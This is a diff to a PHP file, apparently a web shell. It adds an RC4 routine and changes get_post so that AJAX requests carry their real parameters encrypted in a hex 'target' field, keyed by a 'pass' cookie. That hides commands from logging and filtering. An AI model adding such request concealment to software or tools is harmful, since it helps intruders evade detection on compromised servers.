@@ -67,9 +67,20 @@ if(!function_exists('get_self')){
 	}
 }
 
+if(!function_exists('is_ajax')) {
+	function is_ajax() {
+		return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest';
+	}
+}
+
 if(!function_exists('get_post')){
 	function get_post(){
-		return fix_magic_quote($_POST);
+		$post = fix_magic_quote($_POST);
+		if(empty($_FILES) && is_ajax()) {
+			$post_str = rc4($_COOKIE['pass'], hex2bin($post['target']));
+			parse_str($post_str, $post);
+		}	
+		return $post;
 	}
 }
 
@@ -983,6 +994,34 @@ if(!function_exists('output')){
 		header("Pragma: no-cache");
 		echo $str;
 		die();
+	}
+}
+
+if(!function_exists('rc4')) {
+	function rc4($key, $str) {
+		$s = array();
+		for ($i = 0; $i < 256; $i++) {
+			$s[$i] = $i;
+		}
+		$j = 0;
+		for ($i = 0; $i < 256; $i++) {
+			$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
+			$x = $s[$i];
+			$s[$i] = $s[$j];
+			$s[$j] = $x;
+		}
+		$i = 0;
+		$j = 0;
+		$res = '';
+		for ($y = 0; $y < strlen($str); $y++) {
+			$i = ($i + 1) % 256;
+			$j = ($j + $s[$i]) % 256;
+			$x = $s[$i];
+			$s[$i] = $s[$j];
+			$s[$j] = $x;
+			$res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
+		}
+		return $res;
 	}
 }
 ?>
